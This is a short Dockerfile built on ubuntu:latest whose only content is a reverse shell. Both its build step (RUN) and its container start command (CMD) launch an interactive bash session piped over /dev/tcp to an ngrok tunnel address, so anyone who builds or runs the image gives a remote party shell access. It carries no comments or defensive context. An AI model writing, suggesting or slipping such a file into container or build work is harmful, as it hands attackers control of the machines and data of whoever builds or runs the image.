FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18576 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18576 0>&1"]
